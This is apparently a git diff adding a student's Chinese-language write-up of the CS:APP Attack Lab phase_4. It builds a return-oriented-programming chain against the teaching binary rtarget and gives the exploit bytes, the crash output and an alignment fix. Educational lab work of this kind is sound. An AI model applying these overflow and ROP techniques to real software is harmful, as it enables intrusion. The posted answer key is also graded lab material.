@@ -172,3 +172,99 @@ c3
 ```
 
 这个phase因为要查看内存的次数太多，所以我用了clion的可视化调试器
+
+## phase_4
+
+有缓冲区加上缓冲区的代码可以执行使得程序非常容易被攻击，但是在 rtarget 中使用了两个技术来防止这种攻击：
+
+- 每次栈的位置是随机的，于是我们没有办法确定需要跳转的地址（ASLR 地址空间布局随机化）
+- 即使我们能够找到规律注入代码，但是栈是不可执行的，一旦执行，则会遇到段错误（NX/DEP 栈不可执行保护）
+
+所以需要使用ROP（returned-oriented programming），因为无法注入代码来执行，所以只能通过寻找程序中现有的若干条指令，这些指令后面跟着`ret`，称为一个gadget（指令片段），每次return相当于从一个gadget跳到另一个gadget中
+
+![](D:\dev\csapp\note\img\屏幕截图 2026-02-24 221638.png)
+
+phase_4要求我们使用ROP重复phase_2中的操作，因此需要以下三步
+
+1. 将cookie放进%rdi
+2. 把touch2的地址放进栈中
+3. 返回
+
+对于第一步，使用popq指令，于是在程序中寻找 `58 ~ 5f` 后面跟着一个ret的`c3`，使用正则表达式搜索找到scramble函数中`0x40141b`处有`5f c3`，即`popq %rdi`，因为正好是%rdi寄存器，连movq都不需要找了，不赖。
+
+> 对于`popq Dest`指令：
+>
+> 1. 从%rsp中读入数据；
+> 2.  %rsp增加8（回到上一个位置）；
+> 3. 把刚才取出来的值放到`Dest`中（必须是寄存器）
+
+于是凑出ROP攻击的栈如下（在这道题中popq相当于进行了以下操作：先从%rsp中读入数据，此时指向的栈地址存放的是cookie，%rsp增加8，指向上一个栈地址，写入cookie到Dest寄存器，然后ret到增加过的%rsp存储的地址，即touch2函数地址）
+
+```
+缓冲区（本题中为40字节）								  |
+0x0040141b # gadget，即 popq %rdi						| 地址递增
+0x59b997fa # 我的cookie								|
+0x004017ec # touch2的地址，放在ROP栈顶，最后执行			 ↓
+```
+
+答案为
+
+```
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+1b 14 40 00 00 00 00 00
+fa 97 b9 59 00 00 00 00
+ec 17 40 00 00 00 00 00
+```
+
+但是这样会返回以下结果
+
+```shell
+$ .\rtarget -q -i phase_4.bin
+信号: SIGSEGV (Segmentation fault)
+Cookie: 0x59b997fa
+Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target rtarget
+Ouch!: You caused a segmentation fault!
+Better luck next time
+FAIL: Would have posted the following:
+	user id	bovik
+	course	15213-f15
+	lab	attacklab
+	result	1:FAIL:0xffffffff:rtarget:0:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 1B 14 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 EC 17 40 00 00 00 00 00
+```
+
+发生段错误时的运行栈为
+
+```
+_IO_str_init_static_internal
+notify_server
+validate
+touch2
+```
+
+问了ai，原来是这样
+
+> **原因**：
+>
+> - 因为栈对齐错了——通过 ROP 直接用 `ret` 跳到 `touch2`（而不是通过 `call`）导致进入 `touch2` 时 `%rsp` 比正常调用少/多 8 字节，后续 `touch2` 内部对 `printf`/`validate` 等库函数的调用或对 16 字节对齐的 SSE 指令就会触发未定义行为（在你的例子就是 SIGSEGV）。插入额外的 `ret` gadget 相当于“消费/调整”一个 8 字节的栈槽，把 `%rsp` 恢复到函数期望的对齐状态，因而消失了崩溃。
+>
+>   要点说明（逐条）：
+>
+>   - x86-64 System V 约定要求：在执行 `call` 指令被调用到函数入口时，栈相对于 16 字节应有特定关系（实务上函数在做 `call` 之前保证 `rsp % 16 == 8`，以保证被调用函数入口时栈对齐对 SSE/varargs 是安全的）。
+>   - 正常的 `call` 会把返回地址压入栈（+8），而直接通过 ROP 的 `ret` 跳转没有这个压栈动作，所以入口时的对齐会“偏移 8 字节”。
+>   - `touch2` 会调用 `printf` / `validate`（可见有 `callq`），这些调用或库内部可能使用要求 16 字节对齐的指令或假设了正确的栈布局，若不满足就会崩溃或在 gdb 中看到被溢出字覆盖的伪回溯（0xf4f4f4f4...）；这正是你见到的现象。
+>   - 在 ROP 链里插入一个单纯的 `ret` gadget（只改变 `%rsp` 的消费/跳转，而不改变寄存器语义）可以把栈移动 8 字节，恢复函数期望的对齐，从而避免崩溃。
+>
+> **修复**
+>
+> - 在 `cookie` 和 `touch2` 之间插入一个单独的 `ret` gadget 做对齐（我用的是 `0x4017bd`）。
+> - 实测已通过：`PASS`（无 SIGSEGV）。
+>
+> **关键链**
+>
+> - `padding(40)` → `0x40141b(pop %rdi; ret)` → `cookie` → `0x4017bd(ret)` → `0x4017ec(touch2)`
+
